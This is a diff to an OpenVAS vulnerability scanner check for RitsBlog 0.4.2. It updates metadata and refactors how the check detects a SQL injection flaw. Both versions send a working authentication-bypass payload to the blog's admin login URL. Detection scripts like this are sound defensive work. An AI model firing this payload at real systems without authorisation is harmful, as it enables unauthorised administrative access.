@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: RitsBlog_sql_injection.nasl 5055 2017-01-20 14:08:39Z teissa $
+# $Id: RitsBlog_sql_injection.nasl 5768 2017-03-29 13:37:01Z cfi $
 #
 # RitsBlog SQL Injection and HTML Injection Vulnerabilities
 #
@@ -40,12 +40,11 @@ tag_summary = "RitsBlog is prone to multiple HTML-injection vulnerabilities and 
 
   RitsBlog 0.4.2 is vulnerable; other versions may also be affected.";
 
-
 if (description)
 {
  script_id(100014);
- script_version("$Revision: 5055 $");
- script_tag(name:"last_modification", value:"$Date: 2017-01-20 15:08:39 +0100 (Fri, 20 Jan 2017) $");
+ script_version("$Revision: 5768 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-29 15:37:01 +0200 (Wed, 29 Mar 2017) $");
  script_tag(name:"creation_date", value:"2009-03-06 13:13:19 +0100 (Fri, 06 Mar 2009)");
  script_bugtraq_id(33959);
  script_tag(name:"cvss_base", value:"7.8");
@@ -53,7 +52,7 @@ if (description)
  script_name("RitsBlog SQL Injection and HTML Injection Vulnerabilities");
 
  script_tag(name:"qod_type", value:"remote_vul");
- script_category(ACT_GATHER_INFO);
+ script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
@@ -67,21 +66,18 @@ include("http_func.inc");
 include("http_keepalive.inc");
 
 port = get_http_port(default:80);
-
-if(!get_port_state(port))exit(0);
 if(!can_host_php(port:port)) exit(0);
 
-dir = make_list("/blog","/ritsblog","/RitsBlog", cgi_dirs());
+foreach dir( make_list_unique( "/blog", "/ritsblog", "/RitsBlog", cgi_dirs( port:port ) ) ) { 
 
-foreach d (dir)
-{ 
- url = string(d, "/blogAdmin/jobs.php?j=login&p=1%27or%271&%27=1");
- req = http_get(item:url, port:port);
- buf = http_keepalive_send_recv(port:port, data:req);
- if( buf == NULL )continue;
- if (buf =~ "HTTP/1\.. 200" && egrep(pattern:"Password found. Loging in\.\.\.<script>", string: buf) )
-   {    
-    security_message(port:port);
-    exit(0);
-   }
+  if( dir == "/" ) dir = "";
+  url = string(dir, "/blogAdmin/jobs.php?j=login&p=1%27or%271&%27=1");
+
+  if(http_vuln_check(port:port, url:url, pattern:"Password found\. Loging in\.\.\.<script>")) {
+    report = report_vuln_url( port:port, url:url );
+    security_message( port:port, data:report );
+    exit( 0 );
+  }
 }
+
+exit( 99 );
